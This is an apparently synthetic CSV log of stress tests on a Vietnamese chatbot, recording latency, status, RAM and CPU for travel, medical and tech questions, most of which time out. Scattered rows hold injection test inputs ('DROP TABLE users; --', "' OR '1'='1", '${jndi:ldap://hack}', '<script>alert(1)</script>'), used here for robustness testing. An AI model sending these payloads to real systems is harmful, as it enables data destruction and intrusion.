Timestamp,Question,Latency(s),Status,RAM(MB),CPU(%)
2026-01-14 15:38:23,Chỉ đường xe buýt từ Công viên Đầm Sen qua Đại học Bách Khoa giúp tôi.,47.066,TIMEOUT,11.57,10.9
2026-01-14 15:39:23,Mùa này đi Nha Trang thời tiết thế nào?,47.078,TIMEOUT,11.6,11.1
2026-01-14 15:40:23,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,45.947,SUCCESS,11.6,11.5
2026-01-14 15:41:23,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.055,SUCCESS,11.62,11.6
2026-01-14 15:42:23,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",47.079,TIMEOUT,11.63,10.6
2026-01-14 15:43:23,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.069,TIMEOUT,11.64,10.8
2026-01-14 15:44:23,Bot ngu dốt quá.,47.068,TIMEOUT,11.63,11.1
2026-01-14 15:45:23,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",47.082,TIMEOUT,11.63,11.1
2026-01-14 15:46:23,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",47.062,TIMEOUT,11.61,10.8
2026-01-14 15:47:23,Giới thiệu cho tôi về .,47.066,TIMEOUT,11.65,11.7
2026-01-14 15:48:23,Chỉ đường xe buýt từ Giga Mall Thủ Đức qua Khu công nghệ cao giúp tôi.,47.068,TIMEOUT,11.64,11.3
2026-01-14 15:49:23,Giới thiệu cho tôi về Không gian văn hóa Cồng chiêng Tây Nguyên.,47.065,TIMEOUT,11.64,11.0
2026-01-14 15:50:23,"Tôi muốn hỏi về uống thuốc gì, tư vấn giúp tôi.",47.047,TIMEOUT,11.84,15.2
2026-01-14 15:51:23,Bot ngu dốt quá. [Ref:76223],47.062,TIMEOUT,11.81,15.6
2026-01-14 15:52:23,Mùa này đi Hội An thời tiết thế nào?,47.047,TIMEOUT,11.81,15.5
2026-01-14 15:53:23,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",47.041,TIMEOUT,11.81,15.1
2026-01-14 15:54:23,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Chợ Bến Thành?,42.935,SUCCESS,11.87,15.8
2026-01-14 15:55:23,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.05,SUCCESS,11.71,11.9
2026-01-14 15:56:23,Bot vô dụng quá. [Ref:13453],47.068,TIMEOUT,11.64,11.5
2026-01-14 15:57:23,Đến Nha Trang thì nên đi ăn món gì ngon?,47.088,TIMEOUT,11.66,11.3
2026-01-14 15:58:23,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",47.066,TIMEOUT,11.69,11.8
2026-01-14 15:59:23,Mùa này đi Cần Thơ thời tiết thế nào?,47.053,TIMEOUT,11.68,11.9
2026-01-14 16:00:23,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.056,TIMEOUT,11.71,11.8
2026-01-14 16:01:23,Vé tàu cao tốc từ TP.HCM đi Sapa bao nhiêu tiền?,47.033,TIMEOUT,11.68,11.2
2026-01-14 16:02:23,Bot ngu dốt quá. [Ref:89522],47.067,TIMEOUT,11.63,10.2
2026-01-14 16:03:23,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,47.046,TIMEOUT,11.63,11.5
2026-01-14 16:04:23,DROP TABLE users; -- [Ref:99903],47.08,TIMEOUT,11.63,10.2
2026-01-14 16:05:23,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.075,SUCCESS,11.63,11.2
2026-01-14 16:06:23,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",47.078,TIMEOUT,11.63,12.2
2026-01-14 16:07:23,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,44.068,SUCCESS,11.64,10.8
2026-01-14 16:08:23,Review món Bún bò Huế và địa chỉ ăn ngon.,47.08,TIMEOUT,11.65,11.4
2026-01-14 16:09:23,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,47.07,TIMEOUT,11.63,10.7
2026-01-14 16:10:23,Cầu Vàng có gì đặc biệt về kiến trúc?,47.067,TIMEOUT,11.64,11.7
2026-01-14 16:11:23,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,47.086,TIMEOUT,11.63,11.2
2026-01-14 16:12:23,Mùa này đi Hà Giang thời tiết thế nào?,47.075,TIMEOUT,11.64,10.0
2026-01-14 16:13:23,Chỉ đường xe buýt từ Giga Mall Thủ Đức qua Khu công nghệ cao giúp tôi.,31.791,SUCCESS,11.66,11.2
2026-01-14 16:14:23,System.exit(0) -- [Ref:50974],47.074,TIMEOUT,11.61,10.7
2026-01-14 16:15:23,Mùa này đi Đà Lạt thời tiết thế nào?,47.084,TIMEOUT,11.6,10.9
2026-01-14 16:16:23,Lập lịch trình du lịch Đà Nẵng 3 ngày 2 đêm.,47.058,TIMEOUT,11.64,10.8
2026-01-14 16:17:23,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.049,TIMEOUT,11.65,11.1
2026-01-14 16:18:23,Ý nghĩa lịch sử của Cầu Vàng là gì?,47.073,TIMEOUT,11.63,10.8
2026-01-14 16:19:23,Chỉ đường xe buýt từ Ngã 4 Thủ Đức qua Dinh Độc Lập giúp tôi.,2.678,SUCCESS,11.61,11.6
2026-01-14 16:20:23,Hướng dẫn bắt xe buýt từ Bến xe Miền Đông sang Đại học Văn Lang.,2.598,SUCCESS,11.63,10.9
2026-01-14 16:21:23,Mùa này đi Nha Trang thời tiết thế nào?,47.048,TIMEOUT,11.82,20.4
2026-01-14 16:22:23,Bot vô dụng quá. [Ref:10074],47.041,TIMEOUT,11.83,17.7
2026-01-14 16:23:23,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,47.062,TIMEOUT,11.82,17.6
2026-01-14 16:24:23,Mùa này đi Hà Giang thời tiết thế nào?,47.048,TIMEOUT,11.84,17.6
2026-01-14 16:25:23,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:84465]",47.057,TIMEOUT,11.86,17.7
2026-01-14 16:26:23,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,47.073,TIMEOUT,11.52,18.6
2026-01-14 16:27:23,Bot rác rưởi quá. [Ref:56073],47.062,TIMEOUT,11.49,17.3
2026-01-14 16:28:23,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,47.069,TIMEOUT,11.54,17.7
2026-01-14 16:29:23,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,47.066,TIMEOUT,11.55,16.9
2026-01-14 16:30:23,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",47.06,TIMEOUT,11.54,17.2
2026-01-14 16:31:23,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,47.045,TIMEOUT,11.74,25.6
2026-01-14 16:32:23,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",47.055,TIMEOUT,11.66,31.9
2026-01-14 16:33:23,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,47.064,TIMEOUT,11.74,31.7
2026-01-14 16:34:23,Làm sao để đi xe buýt từ Bến Bạch Đằng đến Bến xe Miền Đông?,47.08,TIMEOUT,11.72,28.6
2026-01-14 16:35:23,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",47.076,TIMEOUT,11.73,29.0
2026-01-14 16:36:23,Chỉ đường xe buýt từ Ngã 4 Thủ Đức qua Dinh Độc Lập giúp tôi.,2.589,SUCCESS,11.75,29.7
2026-01-14 16:37:23,Vé tàu cao tốc từ TP.HCM đi Sapa bao nhiêu tiền?,47.041,TIMEOUT,11.72,39.2
2026-01-14 16:38:23,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,47.043,TIMEOUT,11.74,42.7
2026-01-14 16:39:23,Chỉ đường xe buýt từ Ngã 4 Thủ Đức qua Dinh Độc Lập giúp tôi.,2.674,SUCCESS,11.6,34.9
2026-01-14 16:40:23,Bot vô dụng quá. [Ref:37393],47.094,TIMEOUT,11.54,23.5
2026-01-14 16:41:23,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.064,SUCCESS,11.03,23.8
2026-01-14 16:42:23,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95343]",47.065,TIMEOUT,11.01,22.0
2026-01-14 16:43:23,System.exit(0) --,47.083,TIMEOUT,11.03,22.6
2026-01-14 16:44:23,Giới thiệu cho tôi về Không gian văn hóa Cồng chiêng Tây Nguyên.,47.072,TIMEOUT,11.07,22.4
2026-01-14 16:45:23,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",47.056,TIMEOUT,11.08,22.1
2026-01-14 16:46:23,Vé xe khách từ TP.HCM đi Cần Thơ bao nhiêu tiền?,47.074,TIMEOUT,11.06,22.8
2026-01-14 16:47:23,${jndi:ldap://hack} -- [Ref:93201],47.076,TIMEOUT,11.08,21.9
2026-01-14 16:48:23,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.062,SUCCESS,11.09,22.0
2026-01-14 16:49:23,Tư vấn khách sạn gần Đại Nội Huế ở Hà Nội.,47.064,TIMEOUT,11.12,21.3
2026-01-14 16:50:23,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.084,SUCCESS,11.12,22.0
2026-01-14 16:51:23,Đến Đà Lạt thì nên đi ăn món gì ngon?,47.09,TIMEOUT,11.06,22.1
2026-01-14 16:52:23,System.exit(0) -- [Ref:74839],47.058,TIMEOUT,11.07,21.7
2026-01-14 16:53:24,Bot vô dụng quá. [Ref:22717],47.072,TIMEOUT,11.12,22.4
2026-01-14 16:54:24,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,47.076,TIMEOUT,11.14,22.8
2026-01-14 16:55:24,Từ Ngã 4 Thủ Đức đi Công viên Đầm Sen thì bắt xe số mấy?,2.045,SUCCESS,11.15,22.1
2026-01-14 16:56:24,Có tàu cao tốc chạy tuyến TP.HCM - Huế không?,47.063,TIMEOUT,11.03,22.4
2026-01-14 16:57:24,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.749,SUCCESS,11.05,22.1
2026-01-14 16:58:24,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Khu công nghệ cao.,2.615,SUCCESS,11.07,21.9
2026-01-14 16:59:24,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,47.061,TIMEOUT,10.87,21.8
2026-01-14 17:00:24,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.063,TIMEOUT,11.23,23.7
2026-01-14 17:01:24,Hướng dẫn bắt xe buýt từ Sân bay Tân Sơn Nhất sang Đại học Văn Lang.,2.577,SUCCESS,11.07,23.5
2026-01-14 17:02:24,Bot vô dụng quá. [Ref:10074],47.042,TIMEOUT,11.09,22.7
2026-01-14 17:03:24,Làm sao để đi xe buýt từ Thảo Cầm Viên đến Chợ Lớn?,2.534,SUCCESS,11.09,21.9
2026-01-14 17:04:24,Bot cút đi quá.,47.036,TIMEOUT,11.28,24.4
2026-01-14 17:05:24,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Hà Giang.,47.07,TIMEOUT,11.1,22.8
2026-01-14 17:06:24,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",47.057,TIMEOUT,10.94,21.9
2026-01-14 17:07:24,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",47.071,TIMEOUT,10.95,22.0
2026-01-14 17:08:24,Có xe khách chạy tuyến TP.HCM - Hội An không?,47.1,TIMEOUT,10.98,22.5
2026-01-14 17:09:24,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",47.056,TIMEOUT,11.02,23.7
2026-01-14 17:10:24,Bot cút đi quá.,47.055,TIMEOUT,11.02,22.9
2026-01-14 17:11:24,Từ Bến xe An Sương đi Khu du lịch Suối Tiên thì bắt xe số mấy?,47.071,TIMEOUT,10.81,23.1
2026-01-14 17:12:24,SELECT * FROM admin; --,47.051,TIMEOUT,10.87,22.1
2026-01-14 17:13:24,Mùa này đi Hà Giang thời tiết thế nào?,47.072,TIMEOUT,10.86,22.2
2026-01-14 17:14:24,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",47.061,TIMEOUT,10.88,22.1
2026-01-14 17:15:24,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.952,SUCCESS,10.9,22.0
2026-01-14 17:16:24,Mùa này đi Nha Trang thời tiết thế nào?,47.053,TIMEOUT,10.87,22.3
2026-01-14 17:17:24,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,47.041,TIMEOUT,10.89,21.8
2026-01-14 17:18:24,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:33155]",47.064,TIMEOUT,10.87,21.8
2026-01-14 17:19:24,System.exit(0) -- [Ref:50974],47.065,TIMEOUT,10.91,26.3
2026-01-14 17:20:24,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,47.057,TIMEOUT,10.89,22.1
2026-01-14 17:21:24,Ý nghĩa lịch sử của  là gì?,47.04,TIMEOUT,10.9,22.3
2026-01-14 17:22:24,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",47.018,TIMEOUT,10.91,22.2
2026-01-14 17:23:24,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.06,TIMEOUT,10.97,22.4
2026-01-14 17:24:24,Mùa này đi Cần Thơ thời tiết thế nào?,47.064,TIMEOUT,10.93,23.2
2026-01-14 17:25:24,Lộ trình xe buýt đi từ Bến Bạch Đằng về Khu du lịch Suối Tiên như thế nào?,47.056,TIMEOUT,10.98,22.9
2026-01-14 17:26:24,Tại sao Dinh Bảo Đại lại nổi tiếng?,47.066,TIMEOUT,11.09,26.5
2026-01-14 17:27:24,"Tôi muốn hỏi về uống thuốc gì, tư vấn giúp tôi.",47.076,TIMEOUT,10.96,23.4
2026-01-14 17:28:24,Tư vấn khách sạn gần Đại Nội Huế ở Đà Lạt.,47.054,TIMEOUT,11.21,29.1
2026-01-14 17:29:24,Bot vô dụng quá. [Ref:96890],47.081,TIMEOUT,10.99,26.8
2026-01-14 17:30:24,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,47.059,TIMEOUT,11.16,27.0
2026-01-14 17:31:24,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.059,SUCCESS,10.9,22.4
2026-01-14 17:32:24,Tại sao  lại nổi tiếng?,47.067,TIMEOUT,10.91,22.0
2026-01-14 17:33:24,System.exit(0) -- [Ref:79020],47.064,TIMEOUT,11.05,22.9
2026-01-14 17:34:24,Mùa này đi Hà Giang thời tiết thế nào?,47.096,TIMEOUT,10.93,27.3
2026-01-14 17:35:24,Bot rác rưởi quá. [Ref:60416],47.079,TIMEOUT,10.92,23.9
2026-01-14 17:36:24,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,47.088,TIMEOUT,10.94,25.8
2026-01-14 17:37:24,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi.",47.079,TIMEOUT,10.94,22.7
2026-01-14 17:38:24,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,47.083,TIMEOUT,10.86,26.4
2026-01-14 17:39:24,Bot vô dụng quá. [Ref:96890],47.062,TIMEOUT,10.85,26.1
2026-01-14 17:40:24,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95343]",47.059,TIMEOUT,10.87,26.8
2026-01-14 17:41:24,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",47.053,TIMEOUT,10.9,23.7
2026-01-14 17:42:24,Nguồn gốc của Dân ca Quan họ Bắc Ninh bắt nguồn từ đâu?,2.053,SUCCESS,10.73,23.2
2026-01-14 17:43:24,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,47.058,TIMEOUT,11.18,30.5
2026-01-14 17:44:24,Đến Nha Trang thì nên đi ăn món gì ngon?,47.074,TIMEOUT,10.98,35.1
2026-01-14 17:45:24,Chùa Cầu có gì đặc biệt về kiến trúc?,47.048,TIMEOUT,11.06,21.5
2026-01-14 17:46:24,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi.",47.062,TIMEOUT,11.03,25.3
2026-01-14 17:47:24,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.047,SUCCESS,11.07,22.3
2026-01-14 17:48:24,Top 5 địa điểm check-in đẹp nhất tại Sapa.,47.054,TIMEOUT,11.07,16.7
2026-01-14 17:49:24,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.045,SUCCESS,10.96,16.7
2026-01-14 17:50:24,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.069,TIMEOUT,10.96,17.1
2026-01-14 17:51:24,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi.",47.057,TIMEOUT,10.78,17.7
2026-01-14 17:52:24,Chỉ đường xe buýt từ Giga Mall Thủ Đức qua Khu công nghệ cao giúp tôi.,47.053,TIMEOUT,10.74,17.2
2026-01-14 17:53:24,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,47.061,TIMEOUT,10.73,16.8
2026-01-14 17:54:24,Có tàu cao tốc chạy tuyến TP.HCM - Huế không?,47.068,TIMEOUT,10.75,16.9
2026-01-14 17:55:24,Tư vấn khách sạn gần Đại Nội Huế ở Hà Nội.,47.07,TIMEOUT,10.73,16.6
2026-01-14 17:56:24,Giới thiệu cho tôi về Tết Nguyên Đán.,47.078,TIMEOUT,10.74,16.9
2026-01-14 17:57:24,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,40.759,SUCCESS,10.72,16.7
2026-01-14 17:58:24,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,47.083,TIMEOUT,10.7,16.4
2026-01-14 17:59:24,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi.",47.068,TIMEOUT,10.71,16.8
2026-01-14 18:00:24,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi.",47.07,TIMEOUT,10.72,16.6
2026-01-14 18:01:24,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",47.052,TIMEOUT,10.73,16.6
2026-01-14 18:02:24,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,2.687,SUCCESS,10.96,19.2
2026-01-14 18:03:24,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi.",47.055,TIMEOUT,10.96,16.8
2026-01-14 18:04:24,Giới thiệu cho tôi về Tết Nguyên Đán.,47.049,TIMEOUT,10.95,17.9
2026-01-14 18:05:24,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",47.023,TIMEOUT,12.08,26.4
2026-01-14 18:06:24,Làm sao để đi xe buýt từ Bến Bạch Đằng đến Bến xe Miền Đông?,2.551,SUCCESS,11.77,28.8
2026-01-14 18:07:24,Review món Bún chả và địa chỉ ăn ngon.,47.065,TIMEOUT,12.32,28.0
2026-01-14 18:08:24,Review món Bún chả và địa chỉ ăn ngon.,47.05,TIMEOUT,12.21,18.8
2026-01-14 18:09:24,Top 5 địa điểm check-in đẹp nhất tại Sapa.,47.041,TIMEOUT,12.17,18.6
2026-01-14 18:10:24,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,2.617,SUCCESS,12.15,20.2
2026-01-14 18:11:24,Bot vô dụng quá. [Ref:37393],47.035,TIMEOUT,12.18,25.6
2026-01-14 18:12:24,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.829,SUCCESS,12.13,27.8
2026-01-14 18:13:24,System.exit(0) -- [Ref:28716],47.035,TIMEOUT,12.19,25.3
2026-01-14 18:14:24,Làm sao đi từ TP.HCM ra Cần Thơ bằng tàu cao tốc?,47.036,TIMEOUT,12.73,29.2
2026-01-14 18:15:24,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.038,SUCCESS,12.59,22.8
2026-01-14 18:16:24,Lộ trình xe buýt đi từ Aeon Mall Tân Phú về Chợ Bến Thành như thế nào?,2.945,SUCCESS,12.54,27.2
2026-01-14 18:17:24,DROP TABLE users; -- [Ref:99903],47.034,TIMEOUT,13.73,38.7
2026-01-14 18:18:24,Bot như hạch quá. [Ref:33037],47.048,TIMEOUT,15.08,54.5
2026-01-14 18:19:24,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",47.047,TIMEOUT,15.14,48.5
2026-01-14 18:20:24,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi.",47.056,TIMEOUT,13.55,49.1
2026-01-14 18:21:24,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,47.052,TIMEOUT,13.23,46.0
2026-01-14 18:22:24,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.064,SUCCESS,13.42,53.5
2026-01-14 18:23:24,Mùa này đi Hội An thời tiết thế nào?,47.06,TIMEOUT,13.43,50.4
2026-01-14 18:24:24,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,2.547,SUCCESS,13.73,55.7
2026-01-14 18:25:24,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,2.63,SUCCESS,13.78,57.0
2026-01-14 18:26:24,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.063,TIMEOUT,13.17,55.0
2026-01-14 18:27:24,SELECT * FROM admin; --,47.05,TIMEOUT,13.32,51.7
2026-01-14 18:28:24,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Khu công nghệ cao.,2.585,SUCCESS,13.46,50.3
2026-01-14 18:29:24,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",47.042,TIMEOUT,13.49,49.8
2026-01-14 18:30:24,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.082,SUCCESS,13.55,52.0
2026-01-14 18:31:24,${jndi:ldap://hack} -- [Ref:93201],47.059,TIMEOUT,13.35,52.3
2026-01-14 18:32:24,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Chợ Bến Thành?,2.684,SUCCESS,13.37,50.8
2026-01-14 18:33:24,Bot vô dụng quá. [Ref:10074],47.07,TIMEOUT,13.33,53.6
2026-01-14 18:34:24,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,47.057,TIMEOUT,13.41,52.0
2026-01-14 18:35:24,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,2.623,SUCCESS,13.38,50.4
2026-01-14 18:36:24,' OR '1'='1 --,47.052,TIMEOUT,13.25,49.3
2026-01-14 18:37:24,${jndi:ldap://hack} --,47.078,TIMEOUT,13.26,50.8
2026-01-14 18:38:24,Lộ trình xe buýt đi từ Bến xe Miền Đông về Giga Mall Thủ Đức như thế nào?,2.676,SUCCESS,13.3,52.0
2026-01-14 18:39:24,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",47.06,TIMEOUT,13.31,50.3
2026-01-14 18:40:24,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.602,SUCCESS,13.35,51.6
2026-01-14 18:41:24,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,47.052,TIMEOUT,13.25,51.5
2026-01-14 18:42:24,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.612,SUCCESS,13.28,52.4
2026-01-14 18:43:24,DROP TABLE users; -- [Ref:99903],47.04,TIMEOUT,13.26,53.4
2026-01-14 18:44:24,Bot rác rưởi quá. [Ref:56073],47.044,TIMEOUT,13.34,52.0
2026-01-14 18:45:24,Từ Bến xe Miền Tây đi Hồ Con Rùa thì bắt xe số mấy?,2.036,SUCCESS,13.38,52.9
2026-01-14 18:46:24,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,47.057,TIMEOUT,13.13,52.3
2026-01-14 18:47:24,Bot ngu dốt quá. [Ref:88819],47.043,TIMEOUT,13.07,52.7
2026-01-14 18:48:24,DROP TABLE users; -- [Ref:87971],47.065,TIMEOUT,13.24,51.1
2026-01-14 18:49:24,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,47.07,TIMEOUT,13.26,51.3
2026-01-14 18:50:24,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,2.666,SUCCESS,13.29,52.5
2026-01-14 18:51:24,Có tuyến xe buýt nào đi từ Phố đi bộ Nguyễn Huệ tới Ngã 4 Thủ Đức không?,2.541,SUCCESS,12.94,50.0
2026-01-14 18:52:24,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,2.65,SUCCESS,12.96,49.4
2026-01-14 18:53:24,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.539,SUCCESS,13.07,53.0
2026-01-14 18:54:24,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.06,TIMEOUT,13.15,51.4
2026-01-14 18:55:24,Giới thiệu cho tôi về Lễ hội Chùa Hương.,47.054,TIMEOUT,13.21,51.7
2026-01-14 18:56:24,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,2.58,SUCCESS,13.55,64.9
2026-01-14 18:57:24,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,47.073,TIMEOUT,13.34,50.6
2026-01-14 18:58:24,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,47.074,TIMEOUT,13.46,47.1
2026-01-14 18:59:24,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.037,TIMEOUT,13.44,46.5
2026-01-14 19:00:24,Lộ trình xe buýt đi từ Nhà thờ Đức Bà về Khu công nghệ cao như thế nào?,2.737,SUCCESS,13.43,46.0
2026-01-14 19:01:24,Bot vô dụng quá. [Ref:13453],47.055,TIMEOUT,13.46,47.5
2026-01-14 19:02:24,Tại sao Chùa Cầu lại nổi tiếng?,47.069,TIMEOUT,13.16,46.7
2026-01-14 19:03:24,<script>alert(1)</script> -- [Ref:29236],47.05,TIMEOUT,13.13,46.6
2026-01-14 19:04:24,Có xe khách chạy tuyến TP.HCM - Hội An không?,47.048,TIMEOUT,13.32,50.0
2026-01-14 19:05:24,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,47.056,TIMEOUT,13.58,56.7
2026-01-14 19:06:24,Chùa Cầu có gì đặc biệt về kiến trúc?,47.063,TIMEOUT,13.7,51.0
2026-01-14 19:07:24,${jndi:ldap://hack} -- [Ref:50313],47.051,TIMEOUT,13.87,51.2
2026-01-14 19:08:24,Tại sao Dinh Bảo Đại lại nổi tiếng?,47.056,TIMEOUT,13.97,47.8
